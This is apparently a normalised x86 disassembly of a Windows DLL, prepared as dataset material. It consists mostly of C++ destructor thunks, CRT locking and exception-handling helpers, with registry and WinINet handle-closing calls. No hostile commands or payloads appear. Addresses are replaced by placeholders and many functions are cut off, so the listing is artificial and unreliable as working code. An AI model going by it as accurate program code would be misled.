je r-xdata
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_10007677
push esi
mov esi ecx
call sub_10007693
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_10007693
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi ] r--data
je r-xdata
mov [ esi ] r--data
pop esi
retn
push [ esi + 0x10 ]
call sub_10011c31
pop ecx
sub_100076b3
add ecx 0x8
push ecx
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_100106c6
add esp 0x10
retn 0xc
sub_100076fa
add ecx 0x8
push ecx
push [ esp + 0xc ]
call sub_10010697
test [ esp + 0xc ] ax
pop ecx
pop ecx
push 0x0
pop eax
setne al
retn 0x8
sub_10007770
add ecx 0x8
push ecx
push [ esp + 0x8 ]
call sub_1001062a
pop ecx
pop ecx
retn 0x4
sub_100077af
add ecx 0x8
push ecx
push [ esp + 0x8 ]
call sub_100105bd
pop ecx
pop ecx
retn 0x4
sub_100077c1
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x2c ]
pop ebp
retn 0xc
sub_100077dd
mov eax ecx
jmp sub_100077e4
sub_1000787a
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push ecx
call sub_1000788b
retn 0x8
sub_10007b18
push esi
mov esi ecx
call sub_10007b34
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_10007b8c
movzx eax [ esp + 0x4 ]
add ecx 0x8
push ecx
push eax
call sub_100102a1
pop ecx
pop ecx
retn 0x4
sub_10007bcb
movzx eax [ esp + 0x4 ]
add ecx 0x8
push ecx
push eax
call sub_1001040e
pop ecx
pop ecx
retn 0x4
sub_10007bdf
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x1c ]
pop ebp
retn 0xc
sub_10007bfb
mov al [ esp + 0x4 ]
retn 0x4
sub_10007c4f
mov al [ esp + 0x4 ]
retn 0x8
sub_10007cfd
push ebp
mov ebp esp
push ecx
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
add eax 0x18
push eax
call sub_100016de
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10007f53
xor eax eax
inc eax
retn
sub_10007f57
mov al 0x1
retn
sub_10007f5a
push esi
mov esi ecx
call sub_100080d1
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_10007f76
or eax 0xffffffff
retn 0x4
sub_10007f7c
push [ esp + 0x8 ]
mov eax [ ecx ]
push 0xffffffff
push [ esp + 0xc ]
call [ eax + 0x1c ]
retn 0x8
sub_10007f8e
or eax 0xffffffff
retn
sub_100080af
mov eax [ esp + 0x4 ]
mov ecx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
retn 0x20
sub_100080c9
mov eax ecx
retn 0x8
sub_100080ce
retn 0x4
sub_10008130
mov eax [ ecx - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x4 ] r--data
retn
sub_1000813f
push esi
mov esi ecx
call sub_100082de
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000815b
mov eax 0xffff
retn 0x4
sub_10008163
xor eax eax
retn
sub_10008166
mov eax 0xffff
retn
sub_100082a8
mov eax [ esp + 0x4 ]
mov ecx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
retn 0x10
sub_100082c2
push esi
mov esi ecx
call sub_100086e3
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_10008373
mov eax [ ecx - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x8 ] r--data
retn
sub_10008382
mov eax [ eax + 0x24 ]
mov ecx [ eax ]
mov [ esi ] ecx
call sub_100086fb
mov eax esi
retn
sub_10008391
push 0x4
mov eax sub_100281c3
call sub_10014246
mov esi ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
test [ eax + esi + 0x10 ] 0x2
je r-xdata
call sub_100142eb
retn
call sub_10008603
sub_100083ba
mov eax r-xdata
retn
sub_100083c0
mov eax [ eax ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
test eax eax
je r-xdata
retn
lea ecx [ eax + 0x4 ]
jmp sub_1000ff37
sub_1000840d
mov [ ecx ] r--data
jmp sub_10008418
sub_10008418
push esi
mov esi ecx
push 0x0
push 0x1
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_1000197b
mov ecx esi
pop esi
jmp sub_100108d3
sub_10008435
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10008418
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_10008457
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1000848b
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000846f
push esi
mov esi ecx
call sub_10008418
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_100085e2
push ecx
mov eax [ edx + 0x8 ]
or eax [ esp + 0x8 ]
cmp [ edx + 0x28 ] 0x0
jne r-xdata
push [ esp + 0xc ]
mov ecx eax
push edx
call sub_100084c5
pop ecx
retn 0x8
or eax 0x4
sub_10008634
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_10008693
push ecx
mov [ ecx ] r--data
call sub_1000fec1
pop ecx
retn
sub_100086dc
mov [ ecx ] r--data
retn
sub_100086e3
mov ecx [ ecx ]
test ecx ecx
je r-xdata
retn
call sub_100086a1
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_10008723
call sub_1000fcc0
mov [ esi ] eax
call sub_1000faee
mov ecx eax
call sub_100086fb
mov eax esi
retn
sub_10008739
mov [ ecx ] r--data
jmp sub_1000bd6b
sub_10008744
push esi
mov esi ecx
call sub_10008760
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000884f
add ecx 0x4
push ecx
call sub_1000be84
pop ecx
retn
sub_10008b6c
mov [ ecx ] r--data
retn
sub_10008b73
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_10008c0e
push esi
mov esi ecx
call sub_10008c2a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_10008da8
mov [ ebp - 0x4 ] 0x5
mov eax r-xdata
retn
sub_10009109
push esi
mov esi eax
add esi 0x54
mov ecx esi
call sub_100096cf
push esi
mov [ esi ] r--data
call sub_1000fec1
pop ecx
pop esi
retn
sub_10009707
push ecx
and [ esp ] 0x0
push ebx
add eax 0xc
mov ebx ecx
push eax
call sub_10009d9f
mov eax ebx
pop ebx
pop ecx
retn
sub_1000971d
mov eax [ ecx - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0xc ] r--data
mov eax [ ecx - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x4 ] r--data
mov eax [ ecx - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0xc ] r--data
retn
sub_10009bd4
push esi
lea esi [ ecx - 0x54 ]
mov eax esi
call sub_10009109
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_10009c24
push esi
mov esi ecx
call sub_10009748
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_10009e62
push 0x0
mov ecx esi
mov [ esi + 0x18 ] 0xf
call sub_10001ca7
push [ esp + 0x8 ]
mov ecx esi
push [ esp + 0x8 ]
call sub_10001bc6
mov eax esi
retn 0x8
sub_10009f16
mov eax [ ecx - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x8 ] r--data
retn
sub_10009f25
push esi
mov esi ecx
call sub_10009f41
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_10009f77
call [ ecx + 0x20 ]
xor eax eax
retn
sub_1000a07d
sub ecx [ ecx - 0x4 ]
jmp sub_10009f7d
sub_1000a085
sub ecx [ ecx - 0x4 ]
jmp sub_10009fe5
sub_1000a08d
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000a0aa
mov [ ecx ] r--data
retn
sub_1000a2bb
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1000848b
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000a2d3
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10008418
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000a473
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000a4cf
mov [ ecx ] r--data
retn
sub_1000a6cf
push ebp
mov ebp esp
push ecx
push [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1000a62e
mov eax [ ebp + 0x8 ]
pop ecx
leave
retn 0x4
sub_1000a6ea
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1000bd6b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000ac8f
mov [ ecx ] r--data
jmp sub_10008418
sub_1000b0c3
mov al [ ecx + 0xc ]
retn
sub_1000b0c7
mov al [ ecx + 0xd ]
retn
sub_1000b0cb
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_100016bc
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1000b0e5
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_100016bc
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1000b0ff
push esi
mov esi ecx
call sub_1000b097
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000b76c
push esi
mov esi ecx
call sub_1000b788
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000b788
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
pop esi
retn
push eax
call [ RegCloseKey@IAT ]
and [ esi + 0x4 ] 0x0
sub_1000b932
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
test ecx ecx
je r-xdata
retn
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_1000bae7
push esi
push 0x0
push 0x1
lea esi [ edi + 0xc ]
call sub_10001a52
lea eax [ edi + 0x8 ]
pop esi
jmp sub_1000863f
sub_1000bb10
push ecx
and [ esp ] 0x0
push esi
add eax 0xc
mov esi ecx
push eax
call sub_10001738
mov eax esi
pop esi
pop ecx
retn
sub_1000bcf2
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_10013de1
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1000be10
cmp [ esp + 0x4 ] 0x0
jne r-xdata
jmp sub_1000be22
xor eax eax
inc eax
retn 0x4
sub_1000be5e
push [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
call [ eax + 0xc ]
retn
sub_1000be68
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov esi [ ebp + 0x8 ]
sub_1000be75
mov [ esi + 0x11 ] 0x1
mov eax [ esi + 0x14 ]
call sub_100189c9
retn 0x4
sub_1000c13b
push esi
mov esi ecx
call sub_1000c157
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000c2cc
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_10013de1
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1000c4cb
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1000cb91
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000c563
mov [ ecx ] r--data
jmp sub_1000cb91
sub_1000c56e
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1000cb91
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000c590
mov [ ecx ] r--data
jmp sub_1000cb91
sub_1000c61c
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1000cb91
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000c63e
mov [ ecx ] r--data
jmp sub_1000cb91
sub_1000c7b1
push esi
mov esi ecx
call sub_1000c7ea
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000c7cd
push esi
push [ esp + 0xc ]
lea esi [ edi + 0x4 ]
push [ esp + 0xc ]
call sub_10009e62
mov [ edi ] r--data
mov eax edi
pop esi
retn 0x8
sub_1000c7ea
push 0x0
mov [ ecx ] r--data
push 0x1
add ecx 0x4
call sub_1000197b
retn
sub_1000c94a
push esi
mov esi ecx
call sub_1000c966
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000cb25
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_10013de1
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1000cb75
push esi
mov esi ecx
call sub_1000cb91
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_1000cb91
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InternetCloseHandle@IAT ]
and [ esi + 0x4 ] 0x0
sub_1000cbce
push r--data
push [ esp + 0x8 ]
push r--data
call sub_10013458
add eax 0x40
push eax
call sub_1001360d
add esp 0x10
push 0x3
call sub_10013d58
int3
sub_1000cbf5
mov eax [ esp + 0x8 ]
imul eax [ esp + 0xc ]
push eax
call sub_1001338e
pop ecx
retn
sub_1000cc06
cmp [ esp + 0x8 ] 0x0
je r-xdata
retn
push [ esp + 0x8 ]
call sub_10011c31
pop ecx
sub_1000f975
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10001066
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1000f992
mov [ ecx ] r--data
jmp sub_1000109b
sub_1000fa34
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10001127
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1000fa51
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_1001457c
pop ecx
test eax eax
je r-xdata
pop ebp
retn
pop ebp
jmp sub_1001431d
sub_1000fa6b
mov ecx [ ecx + 0x4 ]
call sub_100086a1
test eax eax
je r-xdata
retn
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_1000faee
mov eax [ rw-data ]
retn
sub_1000fe38
mov eax [ ecx ]
cmp eax 0x4
jge r-xdata
retn
imul eax eax 0x18
add eax rw-data
push eax
call sub_10010779
pop ecx
sub_1000ff17
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_10010759
push [ esi ]
call sub_10010ba2
pop ecx
pop ecx
pop esi
retn
sub_1000ff2e
push [ ecx ]
call sub_10010769
pop ecx
retn
sub_1000ff37
push [ ecx ]
call sub_10010779
pop ecx
retn
j_sub_10015995
jmp sub_10015995
sub_1001011a
push r-xdata
call sub_1001457c
neg eax
sbb eax eax
pop ecx
and eax 0x18
retn
sub_100105a7
mov edi edi
push esi
call sub_10016c49
mov esi [ eax + 0x8 ]
call sub_10016c23
mov edx eax
mov eax esi
pop esi
retn
sub_100106f3
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10010c96
sub_10010724
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ rw-data ] eax
test ecx ecx
je r-xdata
retn
cmp eax 0xa
jb r-xdata
call [ eax * 4 + rw-data ]
sub_10010749
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ InitializeCriticalSection@IAT ]
pop ebp
retn
sub_10010759
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteCriticalSection@IAT ]
pop ebp
retn
sub_10010769
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_10010779
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_100107f5
mov eax ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
retn
sub_10010859
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
and [ eax + 0x8 ] 0x0
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_100108d3
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_10011c31
pop ecx
sub_100108e9
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_10010914
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10010876
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10010931
mov [ ecx ] r--data
jmp sub_100108d3
sub_10010a35
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10010ba2
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10011c31
sub_10010c2a
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_10017f60
pop ecx
retn
sub_10010c7b
mov edi edi
push esi
push 0x1
push rw-data
mov esi ecx
call sub_10010859
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_10010f03
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
push eax
push ecx
call sub_10018963
pop ecx
pop ecx
retn
sub_10011077
push esi
call sub_100135a2
pop ecx
retn
sub_10011259
push [ ebp + 0x14 ]
call sub_100135a2
pop ecx
retn
sub_100113bc
push [ ebp + 0xc ]
call sub_100135a2
pop ecx
retn
sub_100114c2
push esi
call sub_100135a2
pop ecx
retn
sub_100115cf
push [ ebp + 0x8 ]
call sub_100135a2
pop ecx
retn
sub_10011780
push [ ebp + 0x8 ]
call sub_100135a2
pop ecx
retn
sub_100118dc
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_100135de
pop ecx
pop ecx
retn
sub_1001190b
push 0x1
call sub_1001a3b0
pop ecx
retn
sub_1001195d
push [ ebp + 0x8 ]
call sub_100135a2
pop ecx
retn
sub_10011967
push 0x1
call sub_1001183a
pop ecx
retn
sub_10011a5b
push esi
call sub_100135a2
pop ecx
retn
sub_10011b0a
call sub_10017c1c
mov ecx [ eax + 0x6c ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
retn
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_10014868
sub_10011c26
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10010ba2
sub_10011c87
push 0x4
call sub_1001a3b0
pop ecx
retn
sub_10013385
push 0x4
call sub_1001a3b0
pop ecx
retn
sub_1001350f
call sub_10011967
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_10011c31
pop ecx
retn
call sub_1001bf7b
sub_1001371f
push [ ebp + 0x8 ]
call sub_100135a2
pop ecx
retn
sub_10013b3c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10013b11
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_10013b54
push 0x8
call sub_1001a48a
pop ecx
retn
sub_10013b5d
push 0x8
call sub_1001a3b0
pop ecx
retn
sub_10013d43
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_1001a3b0
pop ecx
sub_10013d58
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_10013c2c
add esp 0xc
pop ebp
retn
sub_10013d6e
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_10013c2c
add esp 0xc
pop ebp
retn
sub_10013d84
push 0x1
push 0x0
push 0x0
call sub_10013c2c
add esp 0xc
retn
sub_100142eb
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_100142ff
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10010789
jmp sub_100142eb
sub_1001430e
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10010789
jmp sub_100142eb
sub_10014576
call sub_10013b5d
retn
sub_1001457c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10014540
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_100148d2
push 0xc
call sub_1001a3b0
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_100149de
push 0xd
call sub_1001a3b0
pop ecx
retn
sub_100149ea
push 0xc
call sub_1001a3b0
pop ecx
retn
sub_100156b7
push 0xc
call sub_1001a3b0
pop ecx
retn
sub_100156c3
push 0xc
call sub_1001a3b0
pop ecx
retn
sub_100156f4
and [ esi + 0x70 ] 0xffffffef
retn
sub_10015717
mov [ ecx ] r--data
jmp sub_100108d3
sub_10015873
push [ ebp - 0x14 ]
call sub_100157a8
pop ecx
retn
sub_100158b7
call sub_10017c1c
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_10017c1c
add eax 0x90
dec [ eax ]
sub_1001595a
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_10015963
mov esp [ ebp - 0x18 ]
call sub_1001d34d
sub_10015995
call sub_10017c1c
xor ecx ecx
cmp [ eax + 0x90 ] ecx
setne cl
mov al cl
retn
sub_10015a23
push 0x4
mov eax sub_10026981
call sub_10014246
call sub_10017c1c
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1001d386
call sub_1001d399
sub_10015afc
mov eax [ ebp - 0x14 ]
call sub_100158d2
retn
sub_10015d73
xor eax eax
inc eax
retn
sub_10015d77
mov esp [ ebp - 0x18 ]
call sub_1001d34d
sub_10015e0c
xor eax eax
inc eax
retn
sub_10015e10
mov esp [ ebp - 0x18 ]
call sub_1001d34d
sub_100162c2
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10010876
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10016481
push [ ebp + 0x8 ]
call sub_100135a2
pop ecx
retn
sub_10016788
call sub_10017c1c
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xc8 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_10014868
sub_10016bde
call sub_10017c1c
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xac ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_10014868
sub_10016c07
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ eax + 0xac ]
pop ebp
retn
pop ebp
jmp sub_10016bde
sub_10016c23
call sub_10017c1c
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_10014868
sub_10016c49
call sub_10017c1c
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
add eax 0xc
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_10014868
sub_1001794d
and [ rw-data ] 0x0
retn
sub_100179c7
push 0x0
call sub_10017955
pop ecx
retn
sub_10017a42
call [ TlsAlloc@IAT ]
retn 0x4
sub_10017b91
push 0xd
call sub_1001a3b0
pop ecx
retn
sub_10017b9a
push 0xc
call sub_1001a3b0
pop ecx
retn
sub_10017d50
push 0xd
call sub_1001a3b0
pop ecx
retn
sub_10017d5c
push 0xc
call sub_1001a3b0
pop ecx
retn
sub_10017fc7
push 0xe
call sub_1001a3b0
pop ecx
retn
sub_10017fd0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10018244
xor eax eax
inc eax
retn
sub_100189c9
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_10018f65
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1001990f
push [ ebp + 0x8 ]
call sub_10020369
pop ecx
retn
sub_10019bd4
push [ ebp + 0x8 ]
call sub_10020369
pop ecx
retn
sub_1001a107
push [ ebp + 0x8 ]
call sub_100135a2
pop ecx
retn
sub_1001a1f2
push [ ebp + 0x8 ]
call sub_100135a2
pop ecx
retn
sub_1001a304
push [ ebp + 0x8 ]
call sub_10020369
pop ecx
retn
sub_1001a3b0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1001a481
push 0xa
call sub_1001a3b0
pop ecx
retn
sub_1001a61c
push [ ebp + 0x8 ]
call sub_10020369
pop ecx
retn
sub_1001b3f8
push 0xc
push r--data
call sub_10018984
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_100189c9
retn
sub_1001b415
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_1001b4aa
call sub_1001b448
mov [ rw-data ] eax
xor eax eax
retn
sub_1001c011
push 0x1
call sub_1001a3b0
pop ecx
retn
sub_1001c149
push 0x1
call sub_1001a3b0
pop ecx
retn
sub_1001c22a
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_1001c154
add esp 0xc
pop ebp
retn 0x4
sub_1001c25d
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_10021455
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_1001c290
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_1001c154
add esp 0xc
pop ebp
retn 0x8
sub_1001c95c
push [ ebp + 0x8 ]
call sub_10020369
pop ecx
retn
sub_1001ccf7
push 0xd
call sub_1001a3b0
pop ecx
retn
sub_1001d0c2
push 0xd
call sub_1001a3b0
pop ecx
retn
sub_1001d0fb
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_1001cf61
pop ecx
mov [ rw-data ] 0x1
sub_1001d31b
